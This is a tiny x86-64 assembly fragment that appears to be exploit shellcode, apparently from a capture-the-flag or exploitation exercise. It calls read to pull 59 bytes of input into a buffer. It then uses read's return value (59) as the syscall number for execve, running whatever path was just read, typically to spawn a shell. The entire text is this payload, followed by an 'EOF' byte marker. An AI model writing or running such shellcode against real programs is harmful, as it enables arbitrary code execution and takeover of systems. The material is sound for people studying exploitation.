_start:
  add edx, 59
  mov rsi, rax
  xor eax, eax
  syscall
  mov rdi, rsi
  xor esi, esi
  xor edx, edx
  syscall
  db 'E', 'O', 'F'
